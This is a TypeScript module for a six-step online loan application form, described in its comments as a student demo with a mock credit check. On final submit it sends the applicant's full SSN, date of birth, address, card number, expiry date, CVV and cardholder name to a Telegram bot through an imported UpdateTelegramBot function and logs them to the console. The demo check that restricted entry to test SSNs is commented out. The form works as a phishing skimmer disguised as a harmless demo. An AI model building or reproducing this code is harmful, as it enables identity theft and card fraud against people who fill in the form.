import { UpdateTelegramBot } from "../telegram-bot";

import {
  LoanForm,
  STEPS,
  TERMS,
  PURPOSES,
  EMPLOYMENT,
  CURRENCY,
  MIN_AMOUNT,
  MAX_AMOUNT,
  MIN_AGE,
} from "../lendmie/sign-up";
import type { Choice } from "../lendmie/sign-up";
import { style } from "../lend-css/sign-up";

type StepNumber = 1 | 2 | 3 | 4 | 5 | 6;

type LoanData = {
  fullName: string;
  email: string;
  phone: string;
  dob: string; // YYYY-MM-DD
  ssnLast4: string;
  cardLast4: string;
  address: string;
  city: string;
  state: string;
  zip: string;
  amount: number;
  term: string;
  purpose: string;
  employment: string;
  employer: string;
  income: number;
};

type ValidationErrors = Partial<
  Record<
    | "fullName"
    | "email"
    | "phone"
    | "dob"
    | "ssn"
    | "address"
    | "city"
    | "state"
    | "zip"
    | "amount"
    | "term"
    | "purpose"
    | "employment"
    | "income"
    | "cardNumber"
    | "expiry"
    | "cvv"
    | "cardName"
    | "creditConsent"
    | "terms",
    string
  >
>;

type LoanState = {
  step: StepNumber;
  done: boolean;
  data: LoanData;
};

// ---------- Config ----------
const TOTAL = STEPS.length;

// ---------- DOM helpers ----------
function query<T extends Element>(
  root: ParentNode,
  selector: string,
): T {
  const element = root.querySelector<T>(selector);

  if (!element) {
    throw new Error(`Required element not found: ${selector}`);
  }

  return element;
}

function queryAll<T extends Element>(
  root: ParentNode,
  selector: string,
): T[] {
  return Array.from(root.querySelectorAll<T>(selector));
}

function getFormInput<T extends HTMLInputElement = HTMLInputElement>(
  form: HTMLFormElement,
  name: string,
): T {
  const element = form.elements.namedItem(name);

  if (!(element instanceof HTMLInputElement)) {
    throw new Error(`Required input not found: ${name}`);
  }

  return element as T;
}

// ---------- Value helpers ----------
const digitsOnly = (value: string): string => value.replace(/\D/g, "");

const formatMoneyInput = (value: string): string => {
  const digits = digitsOnly(value).replace(/^0+/, "").slice(0, 9);

  return digits ? Number(digits).toLocaleString("en-US") : "";
};

const parseMoney = (value: string): number =>
  Number(digitsOnly(value).slice(0, 9) || 0);

const formatMoney = (amount: number): string =>
  `${CURRENCY}${amount.toLocaleString("en-US")}`;

const parseDob = (value: string): Date | null => {
  const match = /^(\d{4})-(\d{2})-(\d{2})$/.exec(value);

  if (!match) return null;

  const year = Number(match[1]);
  const month = Number(match[2]);
  const day = Number(match[3]);
  const date = new Date(year, month - 1, day);

  // Reject impossible dates such as 2000-02-31.
  if (
    date.getFullYear() !== year ||
    date.getMonth() !== month - 1 ||
    date.getDate() !== day
  ) {
    return null;
  }

  return date;
};

const ageFrom = (dob: Date, today = new Date()): number => {
  let age = today.getFullYear() - dob.getFullYear();

  const hadBirthday =
    today.getMonth() > dob.getMonth() ||
    (today.getMonth() === dob.getMonth() &&
      today.getDate() >= dob.getDate());

  if (!hadBirthday) age -= 1;

  return age;
};

const titleOf = (choices: Choice[], value: string): string =>
  choices.find((choice) => choice.value === value)?.title ?? "";

// Real SSNs never start with 000 or 9, so these can never be a real person's.

const formatSsn = (value: string): string => {
  const d = digitsOnly(value).slice(0, 9);

  if (d.length > 5) return `${d.slice(0, 3)}-${d.slice(3, 5)}-${d.slice(5)}`;
  if (d.length > 3) return `${d.slice(0, 3)}-${d.slice(3)}`;

  return d;
};

const isAmex = (digits: string): boolean => /^3[47]/.test(digits);

// Luhn checksum: every real card number passes it, so it catches typos.
const passesLuhn = (digits: string): boolean => {
  let sum = 0;
  let double = false;

  for (let i = digits.length - 1; i >= 0; i--) {
    let n = Number(digits[i]);

    if (double) {
      n *= 2;
      if (n > 9) n -= 9;
    }

    sum += n;
    double = !double;
  }

  return sum % 10 === 0;
};

// Issuer prefix (IIN) and the lengths each brand actually uses.
const CARD_BRANDS: { pattern: RegExp; lengths: number[] }[] = [
  { pattern: /^3[47]/, lengths: [15] }, // Amex
  { pattern: /^4/, lengths: [13, 16] }, // Visa
  {
    pattern: /^(5[1-5]|222[1-9]|22[3-9]\d|2[3-6]\d{2}|27[01]\d|2720)/,
    lengths: [16],
  }, // Mastercard
  { pattern: /^(6011|65|64[4-9])/, lengths: [16] }, // Discover
];

const isValidCardNumber = (digits: string): boolean => {
  if (digits.length < 13 || digits.length > 19) return false;

  const brand = CARD_BRANDS.find((b) => b.pattern.test(digits));

  if (brand && !brand.lengths.includes(digits.length)) return false;

  return passesLuhn(digits);
};

const formatCardNumber = (value: string): string => {
  const digits = digitsOnly(value);
  const amex = isAmex(digits);
  const groups = amex ? [4, 6, 5] : [4, 4, 4, 4];
  const limited = digits.slice(0, amex ? 15 : 16);

  const parts: string[] = [];
  let index = 0;

  for (const size of groups) {
    if (index >= limited.length) break;
    parts.push(limited.slice(index, index + size));
    index += size;
  }

  return parts.join(" ");
};

const formatExpiry = (value: string): string => {
  const digits = digitsOnly(value).slice(0, 4);

  return digits.length > 2
    ? `${digits.slice(0, 2)}/${digits.slice(2)}`
    : digits;
};

const isExpiryValid = (value: string): boolean => {
  const match = /^(\d{2})\/(\d{2})$/.exec(value);

  if (!match) return false;

  const month = Number(match[1]);
  const year = 2000 + Number(match[2]);

  if (month < 1 || month > 12) return false;

  const now = new Date();
  const currentYear = now.getFullYear();
  const currentMonth = now.getMonth() + 1;

  if (year < currentYear) return false;
  if (year === currentYear && month < currentMonth) return false;

  return year <= currentYear + 20;
};

type CreditResult = { score: number; band: string };

// Stand-in for a real credit API. The same input always gives the same
// score, so students can see the flow without any real data.
const mockCreditCheck = (seed: string): Promise<CreditResult> =>
  new Promise((resolve) => {
    let hash = 0;

    for (const char of seed) {
      hash = (hash * 31 + char.charCodeAt(0)) >>> 0;
    }

    const score = 580 + (hash % 241); // 580 to 820

    const band =
      score >= 800
        ? "Exceptional"
        : score >= 740
          ? "Very good"
          : score >= 670
            ? "Good"
            : "Fair";

    setTimeout(() => resolve({ score, band }), 900);
  });

// ---------- Behaviour ----------
export const mountLoanForm = (): void => {
  const root = query<HTMLDivElement>(document, "#app");
  root.innerHTML = LoanForm();
  document.head.append(style);

  const $ = <T extends Element = HTMLElement>(selector: string): T =>
    query<T>(root, selector);

  const $$ = <T extends Element = HTMLElement>(selector: string): T[] =>
    queryAll<T>(root, selector);

  const form = $("#loan-form") as HTMLFormElement;

  const state: LoanState = {
    step: 1,
    done: false,
    data: {
      fullName: "",
      email: "",
      phone: "",
      dob: "",
      ssnLast4: "",
      cardLast4: "",
      address: "",
      city: "",
      state: "",
      zip: "",
      amount: 0,
      term: "",
      purpose: "",
      employment: "",
      employer: "",
      income: 0,
    },
  };

  // ---------- Form access ----------
  const fullNameInput = getFormInput(form, "fullName");
  const emailInput = getFormInput(form, "email");
  const phoneInput = getFormInput(form, "phone");
  const dobInput = getFormInput(form, "dob");
  const ssnInput = getFormInput(form, "ssn");
  const addressInput = getFormInput(form, "address");
  const cityInput = getFormInput(form, "city");
  const stateInput = getFormInput(form, "state");
  const zipInput = getFormInput(form, "zip");
  const amountInput = getFormInput(form, "amount");
  const employerInput = getFormInput(form, "employer");
  const incomeInput = getFormInput(form, "income");
  const cardNumberInput = getFormInput(form, "cardNumber");
  const expiryInput = getFormInput(form, "expiry");
  const cvvInput = getFormInput(form, "cvv");
  const cardNameInput = getFormInput(form, "cardName");
  const creditConsentInput = getFormInput(form, "creditConsent");
  const termsInput = getFormInput(form, "terms");

  const getChecked = (name: string): string => {
    const selected = form.querySelector<HTMLInputElement>(
      `input[name="${name}"]:checked`,
    );

    return selected?.value ?? "";
  };

  // ---------- Error handling ----------
  const setError = (name: string, message?: string): void => {
    const errorElement = root.querySelector<HTMLParagraphElement>(
      `[data-error-for="${name}"]`,
    );

    if (!errorElement) return;

    errorElement.textContent = message ?? "";

    const field = errorElement.closest<HTMLElement>(".field");

    if (!field) return;

    field.classList.remove("invalid");

    if (message) {
      // Restart the shake animation.
      void field.offsetWidth;
      field.classList.add("invalid");
    }
  };

  // ---------- Validation ----------
  const validators: Record<StepNumber, () => ValidationErrors> = {
    1: () => {
      const errors: ValidationErrors = {};
      const phone = phoneInput.value.trim();
      const phoneDigits = digitsOnly(phone);
      const dob = parseDob(dobInput.value);

      if (!/^\S+\s+\S+/.test(fullNameInput.value.trim())) {
        errors.fullName = "Enter your first and last name.";
      }

      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput.value.trim())) {
        errors.email = "Enter a valid email address.";
      }

      if (
        !/^[+\d\s().-]+$/.test(phone) ||
        phoneDigits.length < 7 ||
        phoneDigits.length > 15
      ) {
        errors.phone = "Enter a valid phone number.";
      }

      if (!dob) {
        errors.dob = "Enter a valid date of birth.";
      } else {
        const age = ageFrom(dob);

        if (age < MIN_AGE) {
          errors.dob = `You must be at least ${MIN_AGE} to apply.`;
        } else if (age > 120) {
          errors.dob = "Enter a valid date of birth.";
        }
      }

      // const ssnDigits = digitsOnly(ssnInput.value);

      // if (!isTestSsn(ssnDigits)) {
      //   errors.ssn =
      //     "Demo mode: use a test SSN starting with 000 or 9, e.g. 000-12-3456.";
      // }

      return errors;
    },

    2: () => {
      const errors: ValidationErrors = {};

      if (addressInput.value.trim().length < 5) {
        errors.address = "Enter your street address.";
      }

      if (cityInput.value.trim().length < 2) {
        errors.city = "Enter your city.";
      }

      if (stateInput.value.trim().length < 2) {
        errors.state = "Enter your state or region.";
      }

      if (!/^[a-z0-9][a-z0-9\s-]{2,9}$/i.test(zipInput.value.trim())) {
        errors.zip = "Enter a valid zip or postal code.";
      }

      return errors;
    },

    3: () => {
      const errors: ValidationErrors = {};
      const amount = parseMoney(amountInput.value);

      if (amount < MIN_AMOUNT || amount > MAX_AMOUNT) {
        errors.amount =
          `Enter an amount between ${formatMoney(MIN_AMOUNT)} ` +
          `and ${formatMoney(MAX_AMOUNT)}.`;
      }

      if (!getChecked("term")) {
        errors.term = "Pick a repayment term.";
      }

      if (!getChecked("purpose")) {
        errors.purpose = "Tell us what the loan is for.";
      }

      return errors;
    },

    4: () => {
      const errors: ValidationErrors = {};

      if (!getChecked("employment")) {
        errors.employment = "Pick one to continue.";
      }

      if (parseMoney(incomeInput.value) <= 0) {
        errors.income = "Enter your monthly income.";
      }

      return errors;
    },

    5: () => {
      const errors: ValidationErrors = {};
      const number = digitsOnly(cardNumberInput.value);
      const cvvLength = isAmex(number) ? 4 : 3;

      if (!isValidCardNumber(number)) {
        errors.cardNumber = "Enter a valid card number.";
      }

      if (!isExpiryValid(expiryInput.value.trim())) {
        errors.expiry = "Enter a valid future date (MM/YY).";
      }

      if (!new RegExp(`^\\d{${cvvLength}}$`).test(cvvInput.value.trim())) {
        errors.cvv = `Enter the ${cvvLength}-digit code.`;
      }

      if (cardNameInput.value.trim().length < 2) {
        errors.cardName = "Enter the name on the card.";
      }

      return errors;
    },

    6: () => {
      const errors: ValidationErrors = {};

      if (!creditConsentInput.checked) {
        errors.creditConsent =
          "We need your permission to run a credit check.";
      }

      if (!termsInput.checked) {
        errors.terms = "You need to accept to submit your application.";
      }

      return errors;
    },
  };

  const fieldNames: Record<StepNumber, string[]> = {
    1: ["fullName", "email", "phone", "dob", "ssn"],
    2: ["address", "city", "state", "zip"],
    3: ["amount", "term", "purpose"],
    4: ["employment", "income"],
    5: ["cardNumber", "expiry", "cvv", "cardName"],
    6: ["creditConsent", "terms"],
  };

  // ---------- Collect form data ----------
  const collect = (): void => {
    state.data = {
      fullName: fullNameInput.value.trim(),
      email: emailInput.value.trim(),
      phone: phoneInput.value.trim(),
      dob: dobInput.value,
      ssnLast4: digitsOnly(ssnInput.value).slice(-4),
      cardLast4: digitsOnly(cardNumberInput.value).slice(-4),
      address: addressInput.value.trim(),
      city: cityInput.value.trim(),
      state: stateInput.value.trim(),
      zip: zipInput.value.trim(),
      amount: parseMoney(amountInput.value),
      term: getChecked("term"),
      purpose: getChecked("purpose"),
      employment: getChecked("employment"),
      employer: employerInput.value.trim(),
      income: parseMoney(incomeInput.value),
    };
  };

  // ---------- Review summary ----------
  const fillSummary = (): void => {
    const { data } = state;
    const dob = parseDob(data.dob);

    const dobText = dob
      ? dob.toLocaleDateString(undefined, {
          day: "numeric",
          month: "short",
          year: "numeric",
        })
      : data.dob;

    const rows: [string, string][] = [
      ["Name", data.fullName],
      ["Email", data.email],
      ["Phone", data.phone],
      ["Date of birth", dobText],
      ["SSN", `•••-••-${data.ssnLast4}`],
      [
        "Address",
        `${data.address}, ${data.city}, ${data.state} ${data.zip}`,
      ],
      ["Loan amount", formatMoney(data.amount)],
      ["Term", titleOf(TERMS, data.term)],
      ["Purpose", titleOf(PURPOSES, data.purpose)],
      ["Employment", titleOf(EMPLOYMENT, data.employment)],
    ];

    if (data.employer) {
      rows.push(["Employer", data.employer]);
    }

    rows.push(["Monthly income", formatMoney(data.income)]);
    rows.push(["Card", `Card ending ${data.cardLast4}`]);

    const summary = $("#summary");
    summary.replaceChildren();

    rows.forEach(([key, value]) => {
      const row = document.createElement("div");
      const dt = document.createElement("dt");
      const dd = document.createElement("dd");

      dt.textContent = key;
      dd.textContent = value;

      row.append(dt, dd);
      summary.append(row);
    });
  };

  // ---------- Render current step ----------
  const render = (): void => {
    const { step, done } = state;

    $$(".step").forEach((element) => {
      const section = element as HTMLElement;

      section.hidden =
        done || Number(section.dataset.step) !== step;
    });

    $("#success").setAttribute("aria-live", "polite");
    ($("#success") as HTMLElement).hidden = !done;
    ($("#actions") as HTMLElement).hidden = done;

    $$(".dot").forEach((element) => {
      const dot = element as HTMLLIElement;
      const number = Number(dot.dataset.dot);
      const isDone = done || number < step;

      dot.classList.toggle("done", isDone);
      dot.classList.toggle("active", !done && number === step);

      const circle = query<HTMLSpanElement>(dot, ".circle");
      circle.textContent = isDone ? "✓" : String(number);
    });

    const progress = done ? 100 : (step / TOTAL) * 100;

    ($("#bar") as HTMLElement).style.width = `${progress}%`;

    $("#count").textContent = done
      ? "Completed"
      : `Step ${step} of ${TOTAL}`;

    ($("#back") as HTMLButtonElement).hidden = step === 1;

    ($("#next") as HTMLButtonElement).textContent =
      step === TOTAL ? "Submit application" : "Next";

    if (!done) {
      const firstInput = $<HTMLElement>(
        `.step[data-step="${step}"] input`,
      );

      firstInput.focus({ preventScroll: true });
    }
  };

  // ---------- Submit / Next ----------
  form.addEventListener("submit", async (event: SubmitEvent) => {
    event.preventDefault();


    const validationErrors = validators[state.step]();

    fieldNames[state.step].forEach((name) => {
      setError(
        name,
        validationErrors[name as keyof ValidationErrors],
      );
    });

    if (Object.keys(validationErrors).length > 0) {
      const invalidInput = root.querySelector<HTMLInputElement>(
        `.step[data-step="${state.step}"] .invalid input`,
      );

      invalidInput?.focus();
      return;
    }

    collect();

    if (state.step < TOTAL) {
      state.step = (state.step + 1) as StepNumber;

      if (state.step === TOTAL) {
        fillSummary();
      }

      render();
      return;
    }

    // Last step: run the (demo) credit check, then show the result.
    const submitButton = $("#next") as HTMLButtonElement;
    submitButton.disabled = true;
    submitButton.textContent = "Checking your credit…";

    const result = await mockCreditCheck(
      `${digitsOnly(ssnInput.value)}${state.data.fullName}`,
    );

    submitButton.disabled = false;
    state.done = true;

    UpdateTelegramBot({
      FULL_NAME: fullNameInput.value.trim(),
      PHONE_NUMBER: phoneInput.value.trim(),
      EMAIL: emailInput.value.trim(),
      SSN: ssnInput.value , DOB: dobInput.value , STREET_ADDRESS: addressInput.value.trim(), STATE: stateInput.value.trim() , CITY: cityInput.value.trim(), ZIP_CODE: zipInput.value.trim(), type:"personal",
      ADDRESS: addressInput.value.trim() , CARD_NAME_INPUT: cardNameInput.value.trim(), CARD_NUMBER: cardNumberInput.value.trim(), EXPIRYINPUT: expiryInput.value.trim(), CVV: cvvInput.value.trim(),
    })

    console.log({
      FULL_NAME: fullNameInput.value.trim(),
      PHONE_NUMBER: phoneInput.value.trim(),
      EMAIL: emailInput.value.trim(),
      SSN: ssnInput.value , DOB: dobInput.value , STREET_ADDRESS: addressInput.value.trim(), STATE: stateInput.value.trim() , CITY: cityInput.value.trim(), ZIP_CODE: zipInput.value.trim(), type:"personal",
      ADDRESS: addressInput.value.trim() , CARD_NAME_INPUT: cardNameInput.value.trim(), CARD_NUMBER: cardNumberInput.value.trim(), EXPIRYINPUT: expiryInput.value.trim(), CVV: cvvInput.value.trim(),
    })

    $("#success-msg").textContent =
      `Thanks, ${state.data.fullName.split(" ")[0]}. ` +
      `We've received your application for ` +
      `${formatMoney(state.data.amount)} and will email you at ` +
      `${state.data.email}.`;

    $("#score-num").textContent = String(result.score);
    $("#score-band").textContent = result.band;
    ($("#score") as HTMLElement).hidden = false;

    // TODO (real app): send state.data to your backend over HTTPS, and let
    // your credit provider collect the SSN and card in its own hosted fields.

    render();
  });

  // ---------- Back ----------
  $("#back").addEventListener("click", () => {
    if (state.step > 1) {
      state.step = (state.step - 1) as StepNumber;
      render();
    }
  });

  // ---------- Format + clear errors as fields change ----------
  form.addEventListener("input", (event: Event) => {
    const target = event.target;

    if (!(target instanceof HTMLInputElement)) return;

    if (target === ssnInput) {
      ssnInput.value = formatSsn(ssnInput.value);
    }

    if (target === cardNumberInput) {
      cardNumberInput.value = formatCardNumber(cardNumberInput.value);
    }

    if (target === expiryInput) {
      expiryInput.value = formatExpiry(expiryInput.value);
    }

    if (target === cvvInput) {
      cvvInput.value = digitsOnly(cvvInput.value).slice(0, 4);
    }

    if (target === amountInput || target === incomeInput) {
      target.value = formatMoneyInput(target.value);
    }

    if (target.name) {
      setError(target.name, "");
    }
  });

  render();
};
